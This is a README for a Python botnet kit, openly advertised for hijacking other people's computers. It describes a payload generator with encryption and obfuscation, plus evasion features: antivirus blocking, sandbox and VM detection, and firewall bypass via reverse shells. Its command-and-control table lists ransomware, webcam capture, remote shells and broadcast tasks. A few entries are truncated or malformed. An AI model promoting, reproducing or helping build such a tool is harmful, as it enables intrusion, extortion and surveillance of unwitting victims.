# SKYNET BOTNET

# ![](https://repository-images.githubusercontent.com/721243848/8ef413f2-5116-47de-89fb-0cc3cea94776)

## Build Your Own Botnet Project Build For People Who Wanna Hijack Peoples Computers And Control Them With Over 300 Features!

# CLIENT

Client Generator (Build Your Own Botnet)

## usage: client.py 
                [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
                [--encrypt] [--obfuscate] [--compress] [--freeze]
                host port [module [module ...]]

## Generator (Build Your Own Botnet)

## positional arguments:
    host            server IP address
    port            server port number
    module          module(s) to remotely import at run-time

## optional arguments:
###    -h, --help      
    show this help message and exit
###    -v, --version   
    show program's version number and exit
###    --name NAME     
    output file name
###    --icon ICON     
    icon image file name
###    --pastebin API 
    upload & host payload on pastebin
###    --encrypt     
    encrypt payload and embed key in stager
###    --compress     
    zip-compress into a self-executing python script
###    --freeze      
    compile client into a standalone executable for the current host platform

# Generate clients with the following features:

### - Zero Dependencies
        stager runs with just the python standard library

###  - Remote Imports
        remotely import third-party packages from
        the server without downloading/installing them

###  - In-Memory Execution Guidline
        clients never write anything to the disk,
        not even temporary files - zero IO system calls.
        remote imports allow code/scripts/modules to
        be dynamically loaded into memory and directly
        imported into the currently running process

###  - Add Your Own Scripts
        every python script, module, and package in the
        `remote` directory is directl usable by every
        client at all times while the server is running

###  - Unlimited Modules Without Bloating File Size
        use remote imports to add unlimited features without
        adding a single byte to the client's file size

###  - Updatable
        client periodically checks the content available
        for remote import from the server, and will
        dynamically update its in-memory resources
        if anything has been added/removed

###   - Platform Independent
        compatible with PyInstaller and package is authored
        in Python, a platform agnostic language

###   - Bypass Firewall
        connects to server via outgoing connections
        (i.e. reverse TCP payloads) which most firewall
        filters allow by default k

###   - Evade Antivirus
        blocks any spawning process
        with names of known antivirus products

###   - Prevent Analysis
        main client payload encrypted with a random
        256-bit key and is only

###   - Avoid Detection
        client will abort execution if a virtual machine
        or sandbox is detected

# SERVER

  Console-based command & control server with a streamlined user-interface for controlling clients
  with reverse TCP shells which provide direct terminal access to the client host machines, as well
  as handling session authentication & management, serving up any scripts/modules/packages requested
  by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
  incoming completed tasks from clients

# COMMANDS

  ### set 
                'method': self.set,
                'usage': 'set <setting> [option=value]',
                'description': 'change the value of a setting'
                
  ### help 
                'method': self.help,
                'usage': 'help',
                'description': 'show usage help for server commands'
                
  ### exit 
                'method': self.quit,
                'usage': 'exit',
                'description': 'quit the server'
                
  ### debug 
                'method': self.debug,
                'usage': 'debug <code>',
                'description': 'run python code directly on server (debugging MUST be enabled)'
                
  ### query 
                'method': self.query,
                'usage': 'query <statement>',
                'description': 'query the SQLite database'
                
  ### options 
                'method': self.settings,
                'usage': 'options',
                'description': 'show currently configured settings'
                
  ### sessions 
                'method': self.session_list,
                'usage': 'sessions',
                'description': 'show active client sessions'
                
  ### clients 
                'method': self.session_list,
                'usage': 'clients',
                'description': 'show all clients that have joined the server'
                
  ### shell 
                'method': self.session_shell,
                'usage': 'shell <id>',
                'description': 'interact with a client with a reverse TCP shell through an active session'
                
  ### ransom 
                'method': self.session_ransom,
                'usage': 'ransom [id]',
                'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'
                
  ### webcam 
                'method': self.session_webcam,
                'usage': 'webcam <mode>',
                'description': 'capture image/video from the webcam of a client device'
                
  ### kill 
                'method': self.session_remove'
                'usage': 'kill <id>',
                'description': 'end a session
  ### bg 
                'method': self.session_background,
                'usage': 'bg [id]',
                'description': 'background a session (default: the current session)'
                
  ### broadcast 
                'method': self.task_broadcast,
                'usage': 'broadcast <command>',
                'description': 'broadcast a task to all active sessions'
                
  ### results 
                'method': self.task_list,
                'usage': 'results [id]',
                'description': 'display all completed task results for a client (default: all clients)'
                
  ### tasks
                'method': self.task_list,
                'usage': 'tasks [id]',
                'description': 'display all incomplete tasks for a client (default: all clients)'
                
